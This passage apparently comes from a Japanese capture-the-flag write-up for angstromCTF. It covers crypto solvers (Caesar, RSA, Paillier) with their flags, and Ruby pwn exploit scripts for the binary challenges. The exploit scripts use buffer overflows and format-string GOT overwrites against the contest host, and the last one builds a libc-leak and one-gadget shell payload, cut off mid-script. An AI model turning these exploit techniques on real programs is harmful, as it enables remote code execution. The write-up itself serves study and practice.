&lt;li&gt;&lt;strong&gt;actf{control_u_so_we_can&amp;rsquo;t_control_you}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;

&lt;h3 id=&#34;classy-cipher&#34;&gt;Classy Cipher&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{so_charming}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; encrypted:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;chr&lt;/span&gt;((&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(c)&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;i) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;really-secure-algorithm&#34;&gt;Really Secure Algorithm&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;RSAのパラメータがe, p, q, cが渡されるので復号するだけ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{really_securent_algorithm}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;require_relative &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;../../tools/ctf/crypto.rb&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889&lt;/span&gt;
q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493&lt;/span&gt;
e &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;65537&lt;/span&gt;
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349&lt;/span&gt;

rsa &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;RSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new(e, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; q, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt;, q)
m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rsa&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;decrypt(c)
&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;half-and-half&#34;&gt;Half and Half&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;ソースコードが渡されるので呼んでソルバを書くだけ

&lt;ul&gt;
&lt;li&gt;24文字を12byteに分割しxor取った値に等しくなるようにする&lt;/li&gt;
&lt;li&gt;フラグフォーマットは、&lt;code&gt;actf{&lt;/code&gt;なので先頭5byteと後半の5byteもxorして判明(&lt;code&gt;taste&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;問題文から&lt;code&gt;taste&lt;/code&gt;に合うような単語で&lt;code&gt;coffee&lt;/code&gt;を&lt;code&gt;actf{&lt;/code&gt;の後に繋げると後半が&lt;code&gt;good&lt;/code&gt;と文章が成り立つ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{coffee_tastes_good}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;runes&#34;&gt;Runes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ

&lt;ul&gt;
&lt;li&gt;復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{crypto_lives}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;gmp&amp;#39;&lt;/span&gt;

n &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648883&lt;/span&gt;)
&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;310013024566643256138761337388255591613&lt;/span&gt;
q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;319848228152346890121384041219876391791&lt;/span&gt;
g &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648884&lt;/span&gt;)
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869&lt;/span&gt;)
l &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z((&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;lcm(q &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;))
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;L&lt;/span&gt;(u, n)
  (u &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#b68&#34;&gt;/ n
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;end
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;c_lambda = L(c.powmod(l, n.pow(2)), n)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;print([m].pack(&amp;#34;H*&amp;#34;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;

&lt;h3 id=&#34;aquarium&#34;&gt;Aquarium&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{overflowed_more_than_just_a_fish_tank}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19305&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x98&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x4011b6&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;chain-of-rope&#34;&gt;Chain of Rope&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{dark_web_bargains}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19400&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;access&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x38&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x401231&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;purchases&#34;&gt;Purchases&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる&lt;/li&gt;
&lt;li&gt;関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする

&lt;ul&gt;
&lt;li&gt;末尾2byteですむので楽に書き換えられる&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{limited_edition_flag}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19011&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4534c%10$hnAAAA&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;else. &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;returns&#34;&gt;Returns&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ&lt;/li&gt;
&lt;li&gt;libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う&lt;/li&gt;
&lt;li&gt;出力バイトの関係から分割して書き込むために、はじめに&lt;code&gt;puts@got&lt;/code&gt;をmainに書き換えておき何度もFSBを使えるようにする&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える&lt;/li&gt;
&lt;li&gt;最後に、&lt;code&gt;puts@got&lt;/code&gt;を&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;になおしてあげればOne gadgetが実行される&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{no_returns_allowed}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: utf-8&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19307&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;shell.actf.co&amp;#34;, 19011&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Leaking libc address and overwriting puts@got to the entrypoint of main function&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4518c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gsub(&lt;span style=&#34;color:#b68&#34;&gt;/\s/&lt;/span&gt;,&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
libc_start_main &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/BBB(.*)@@\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;chop&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;240&lt;/span&gt;
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_start_main &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;__libc_start_main&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base address = &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;libc_base&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

one_gadget &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
high &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff00000000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;32&lt;/span&gt;
low &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff&lt;/span&gt;
llow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff0000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;
hlow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwriting __stack_chk_fail@got to one gadget RCE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;high&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2c\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;hlow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x28\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
